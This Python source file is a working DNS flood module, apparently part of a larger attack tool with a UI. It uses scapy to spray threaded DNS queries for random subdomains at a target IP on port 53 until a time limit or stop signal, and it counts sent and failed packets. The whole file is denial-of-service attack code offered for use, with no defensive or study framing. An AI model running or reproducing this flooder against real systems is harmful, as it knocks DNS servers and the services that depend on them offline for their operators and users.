import random
import string
import time
from threading import Thread, Lock
from scapy.all import IP, UDP, DNS, DNSQR, send

def launch(target_ip, port_list, duration, tag, stop_event, fail_tracker, confirmed=False):
    # Check if port 53 is present in port_list
    dns_ports = [p for p in port_list if p == 53]
    
    if not dns_ports:
        if not confirmed:
            # Signal UI that confirmation is required
            return {
                "status": "confirm_required",
                "message": f"Port 53 not found in port list for {tag}. Proceed with DNS flood anyway?"
            }
        else:
            # User confirmed, force port 53
            print(f"[!] Warning: Forcing port 53 for DNS flood {tag} despite no port 53 in port list")
            port_list = [53]
    else:
        port_list = dns_ports

    threads = []
    stats_lock = Lock()
    stats = {'sent': 0, 'fail': 0}

    def random_subdomain(length=8):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def worker():
        while not stop_event.is_set():
            for port in port_list:
                domain = random_subdomain() + '.example.com'
                pkt = IP(dst=target_ip) / UDP(dport=port) / DNS(rd=1, qd=DNSQR(qname=domain))
                try:
                    send(pkt, verbose=0)
                    with stats_lock:
                        stats['sent'] += 1
                except Exception:
                    with stats_lock:
                        stats['fail'] += 1
                        if stats['fail'] > 20:
                            print(f"[x] DNS flood {tag} stopped due to excessive failures.")
                            stop_event.set()
                            break
                if stop_event.is_set():
                    break

    print(f"[+] Starting DNS flood attack {tag} on port(s) {port_list}")

    threads_per_attack = 10  # You can adjust this as needed

    for _ in range(threads_per_attack):
        t = Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    start_time = time.time()
    while (duration == 0 or time.time() - start_time < duration) and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()

    for t in threads:
        t.join()

    print(f"[+] DNS flood attack {tag} ended. Packets sent: {stats['sent']}, Failures: {stats['fail']}")

    if stats['fail'] > 10:
        fail_tracker.append(f"{tag}-dnsflood")

    # If fail_tracker supports sent/fail counters, update them safely
    if hasattr(fail_tracker, 'sent'):
        with stats_lock:
            fail_tracker['sent'] += stats['sent']
            fail_tracker['fail'] += stats['fail']

    return {"status": "completed"}
